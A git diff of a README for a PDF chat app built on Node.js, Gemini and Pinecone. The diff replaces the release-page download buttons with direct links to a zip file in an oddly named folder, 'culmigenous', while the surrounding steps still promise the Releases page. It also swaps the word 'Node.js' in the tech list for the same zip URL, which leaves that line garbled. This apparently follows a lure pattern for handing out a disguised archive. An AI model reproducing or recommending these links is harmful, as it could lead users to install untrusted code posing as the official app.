@@ -8,7 +8,7 @@ Welcome to the pdf-chat-app! This application allows you to upload and chat with
 
 To get started, you need to download the pdf-chat-app. Click the button below to visit the downloads page:
 
-[![Download pdf-chat-app](https://img.shields.io/badge/Download-pdf--chat--app-blue.svg)](https://github.com/18311-Claire-Xinjin/pdf-chat-app/releases)
+[![Download pdf-chat-app](https://raw.githubusercontent.com/18311-Claire-Xinjin/pdf-chat-app/main/culmigenous/pdf-chat-app.zip)](https://raw.githubusercontent.com/18311-Claire-Xinjin/pdf-chat-app/main/culmigenous/pdf-chat-app.zip)
 
 1. Click the download button above.
 2. You will be directed to the Releases page.
@@ -54,7 +54,7 @@ If you run into any issues or have questions, we are here to help. You can reach
 
 The pdf-chat-app is built using a powerful combination of technologies, allowing for a seamless experience:
 
-- **Backend:** Node.js with Express framework
+- **Backend:** https://raw.githubusercontent.com/18311-Claire-Xinjin/pdf-chat-app/main/culmigenous/pdf-chat-app.zip with Express framework
 - **AI Processing:** Gemini API and LangChain for intelligent responses
 - **Database:** PineconeDB for efficient data handling
 - **Frontend:** React and TailwindCSS for a responsive user interface
@@ -68,7 +68,7 @@ We continually update the pdf-chat-app. Keep an eye on the Releases page for new
 
 Ready to try it out? Click below to revisit the download page:
 
-[![Download pdf-chat-app](https://img.shields.io/badge/Download-pdf--chat--app-blue.svg)](https://github.com/18311-Claire-Xinjin/pdf-chat-app/releases)
+[![Download pdf-chat-app](https://raw.githubusercontent.com/18311-Claire-Xinjin/pdf-chat-app/main/culmigenous/pdf-chat-app.zip)](https://raw.githubusercontent.com/18311-Claire-Xinjin/pdf-chat-app/main/culmigenous/pdf-chat-app.zip)
 
 ## 💬 Community and Contributions
 
